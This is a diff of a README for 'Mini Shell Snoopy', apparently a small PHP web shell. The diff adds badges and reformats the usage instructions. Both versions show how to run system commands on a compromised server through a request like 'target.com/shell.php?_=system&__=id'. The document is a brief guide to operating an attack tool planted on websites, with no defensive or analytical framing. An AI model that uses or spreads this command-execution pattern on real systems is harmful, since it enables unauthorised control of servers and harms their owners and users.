@@ -1,3 +1,8 @@
 # Mini Shell Snoopy
-How to use access your shell: php?_=system&__=id<br>
-Example: site.co.li/shell.php?_=system&__=id
+[![Version](https://img.shields.io/badge/Mini_Command-PHP-blue.svg)]()
+[![Stage](https://img.shields.io/badge/Based-PHP-blue.svg)]()
+
+---
+## How to use 
+- You can access your shell: php?_=system&__=id<br>
+- ```Example: target.com/shell.php?_=system&__=id```
